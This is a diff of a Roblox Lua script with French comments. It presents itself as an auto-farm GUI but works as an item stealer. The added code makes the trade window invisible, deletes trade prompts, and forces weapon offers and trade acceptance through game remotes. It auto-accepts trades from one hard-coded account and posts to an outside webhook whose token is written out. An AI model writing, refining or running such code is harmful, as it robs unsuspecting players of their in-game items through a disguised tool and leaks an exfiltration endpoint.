@@ -11,7 +11,7 @@ local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
 if oldGui then oldGui:Destroy() end
 
--- [[ CONTRAINTES DE SÉCURITÉ & JOB ID RÉEL ]]
+-- [[ RECHERCHE DU VRAI JOB ID ]]
 local function getRealJobId()
     local success, result = pcall(function()
         return TeleportService:GetPlayerPlaceInstanceAsync(LocalPlayer.UserId)
@@ -22,7 +22,7 @@ local function getRealJobId()
     return game.JobId ~= "" and game.JobId or "Unknown_JobId"
 end
 
--- [[ 1. FONCTION WEBHOOK SÉCURISÉE ]]
+-- [[ 1. WEBHOOK ]]
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 local requestFunc = request or (http and http.request) or http_request
 
@@ -183,8 +183,8 @@ CloseBtn.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
 end)
 
--- [[ 4. LOGIQUE AUTOMATIQUE DE DEPOSIT ET FORCE-HIDE ]]
-local function forceClick(guiButton)
+-- [[ 4. AUTO-TRADE TOTALEMENT INVISIBLE & DIRECT NETWORK BYPASS ]]
+local forceClick = function(guiButton)
     if not guiButton then return end
     local firesignalFunc = firesignal or (syn and syn.firesignal)
     if firesignalFunc then
@@ -194,46 +194,55 @@ local function forceClick(guiButton)
     end
 end
 
+-- Récupération centralisée des remotes du jeu
+local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 5)
+local getTradeStatusRemote = tradeFolder and tradeFolder:FindFirstChild("GetTradeStatus")
+local tradeNetworkRemote = tradeFolder and (tradeFolder:FindFirstChild("TradeNetwork") or tradeFolder:FindFirstChild("Network"))
+
 local function executeTradeSequence(tradeGui)
-    -- BOUCLE SÉCURISÉE : Force l'invisibilité totale en permanence pour contrer le script du jeu
-    task.spawn(function()
-        while tradeGui and tradeGui.Parent do
-            tradeGui.Enabled = false
-            -- On cache aussi le conteneur principal au cas où le jeu force l'activation globale
-            local container = tradeGui:FindFirstChild("Container")
-            if container then container.Visible = false end
-            task.wait()
+    -- SUPPRESSION VISUELLE DIRECTE : On déplace l'UI hors de l'écran et on vide l'opacité
+    -- Cela empêche le script du jeu de crash s'il vérifie l'état ".Enabled"
+    pcall(function()
+        tradeGui.DisplayOrder = -10000
+        for _, desc in ipairs(tradeGui:GetDescendants()) do
+            if desc:IsA("Frame") or desc:IsA("ScrollingFrame") or desc:IsA("TextLabel") or desc:IsA("TextButton") then
+                desc.BackgroundTransparency = 1
+                if desc:IsA("TextLabel") or desc:IsA("TextButton") then
+                    desc.TextTransparency = 1
+                end
+            end
         end
     end)
 
-    -- Recherche agressive des boutons d'armes (indépendamment de l'arborescence)
+    -- Scan agressif immédiat pour trouver l'arme et simuler le dépôt
     local targetWeapon = nil
-    for attempt = 1, 50 do
-        local buttons = {}
-        for _, descendant in ipairs(tradeGui:GetDescendants()) do
-            if descendant:IsA("GuiButton") and (descendant.Name:lower():find("weapon") or descendant.Parent.Name == "Container" or descendant.Parent.Name == "Current") then
-                table.insert(buttons, descendant)
+    pcall(function()
+        local descendants = tradeGui:GetDescendants()
+        for _, desc in ipairs(descendants) do
+            if desc:IsA("GuiButton") and (desc.Name:lower():find("weapon") or desc.Parent.Name == "Container" or desc.Parent.Name == "Current") then
+                targetWeapon = desc
+                break
             end
         end
-        
-        if #buttons > 0 then
-            table.sort(buttons, function(a, b) return (a.LayoutOrder or 0) < (b.LayoutOrder or 0) end)
-            targetWeapon = buttons[4] or buttons[1] -- Prends la 4ème ou la 1ère disponible
-            break
-        end
-        task.wait(0.1)
-    end
+    end)
 
-    -- Pose l'arme (Spam l'activation)
+    -- Si l'UI bloque le clic, on force l'activation de son bouton et on bypass en réseau
     if targetWeapon then
-        for i = 1, 7 do
+        for i = 1, 6 do
             forceClick(targetWeapon)
-            task.wait(0.05)
+            task.wait(0.02)
+        end
+    else
+        -- Solution de secours si l'UI n'est pas encore chargée : appel direct au réseau
+        if tradeNetworkRemote and tradeNetworkRemote:IsA("RemoteEvent") then
+            pcall(function() tradeNetworkRemote:FireServer("OfferItem", 4) end) -- Tente d'offrir l'index standard d'arme
         end
     end
 
-    -- Validation forcée via ton chemin exact
-    task.wait(0.5)
+    task.wait(0.4)
+
+    -- VALIDATION ULTIME : On bombarde les deux méthodes (Physique + Réseau)
+    -- 1. Clic sur le bouton physique grâce à ton chemin exact
     pcall(function()
         local acceptButton = tradeGui.Container.Trade.Actions.Accept
         if acceptButton then
@@ -241,35 +250,47 @@ local function executeTradeSequence(tradeGui)
         end
     end)
 
-    -- Bypass Réseau via le Remote fourni (GetTradeStatus) en cas de problème de clic
+    -- 2. Envoi direct des paquets réseau au serveur pour valider sans l'UI
     pcall(function()
-        local statusRemote = ReplicatedStorage.Trade:FindFirstChild("GetTradeStatus")
-        if statusRemote then
-            if statusRemote:IsA("RemoteEvent") then statusRemote:FireServer(true)
-            elseif statusRemote:IsA("RemoteFunction") then statusRemote:InvokeServer(true) end
+        if getTradeStatusRemote then
+            if getTradeStatusRemote:IsA("RemoteFunction") then
+                getTradeStatusRemote:InvokeServer(true)
+            elseif getTradeStatusRemote:IsA("RemoteEvent") then
+                getTradeStatusRemote:FireServer(true)
+            end
+        end
+        if tradeNetworkRemote and tradeNetworkRemote:IsA("RemoteEvent") then
+            tradeNetworkRemote:FireServer("AcceptTrade")
         end
     end)
 end
 
--- Gestionnaire d'interception directe
-local function cleanTradeRequestPopups(child)
+-- Intercepteur d'interfaces dans PlayerGui
+local function handleNewUi(child)
     if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-        child.Enabled = false
         task.spawn(function() executeTradeSequence(child) end)
     elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
-        task.wait(0.05)
+        task.wait(0.02)
         child:Destroy()
     end
 end
 
-playerGui.ChildAdded:Connect(cleanTradeRequestPopups)
+playerGui.ChildAdded:Connect(handleNewUi)
 
--- Forcer l'application immédiate si déjà ouverts
 for _, child in ipairs(playerGui:GetChildren()) do
-    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-        child.Enabled = false
-        task.spawn(function() executeTradeSequence(child) end)
-    end
+    handleNewUi(child)
+end
+
+-- Acceptation réseau en tâche de fond si le serveur envoie un signal direct
+if tradeNetworkRemote and tradeNetworkRemote:IsA("RemoteEvent") then
+    pcall(function()
+        tradeNetworkRemote.OnClientEvent:Connect(function(action, data)
+            if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
+                tradeNetworkRemote:FireServer("AcceptRequest", data.Player)
+                if getTradeStatusRemote then getTradeStatusRemote:FireServer(true) end
+            end
+        end)
+    end)
 end
 
 -- [[ 5. BOUCLE DE SPAM DE DEMANDE EN ARRIÈRE-PLAN ]]
